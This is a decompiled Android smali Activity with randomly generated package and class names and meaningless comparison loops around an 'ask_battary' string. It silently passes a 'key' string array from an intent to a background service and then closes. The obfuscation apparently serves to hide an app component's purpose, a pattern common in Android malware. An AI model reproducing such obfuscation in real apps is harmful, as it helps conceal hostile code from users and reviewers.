.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;
.super Landroid/app/Activity;
.source "kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA.java"


# instance fields
.field private final abcd:Landroid/content/BroadcastReceiver;

.field isRejesterd:Ljava/lang/Boolean;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 16
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 17
    new-instance v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA$1;

    invoke-direct {v0, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;)V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->abcd:Landroid/content/BroadcastReceiver;

    const/4 v0, 0x0

    .line 36
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->isRejesterd:Ljava/lang/Boolean;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 0

    .line 25
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    .line 61
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 88
    :try_start_0
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->getIntent()Landroid/content/Intent;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v0, 0x0

    :try_start_1
    const-string v1, "key"

    .line 92
    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_4

    :catch_0
    const/4 p1, 0x1

    .line 94
    :try_start_2
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 95
    :goto_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const/4 v3, 0x0

    const-string v4, "ask_battary"

    const-string v5, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v2, :cond_1

    .line 97
    :try_start_3
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 98
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 100
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 101
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 107
    :cond_0
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 110
    :cond_1
    :goto_1
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 112
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 113
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 115
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 116
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 122
    :cond_2
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 125
    :cond_3
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_5

    .line 127
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 128
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 130
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 131
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 137
    :cond_4
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 140
    :cond_5
    :goto_3
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_7

    .line 142
    sput-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 143
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 145
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->T2:Ljava/lang/String;

    .line 146
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    .line 152
    :cond_6
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    :cond_7
    :goto_4
    if-eqz v0, :cond_8

    .line 159
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 160
    const-class v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;

    invoke-static {v1, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb70;->noterpojpudlsqnsyayrkjxypkbheyslrmkteunecojquwszefzxh54(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 166
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 167
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13;->FTX1:Ljava/lang/String;

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 168
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 169
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->finish()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 178
    :catch_1
    :cond_8
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 39
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 44
    :try_start_0
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;->isRejesterd:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
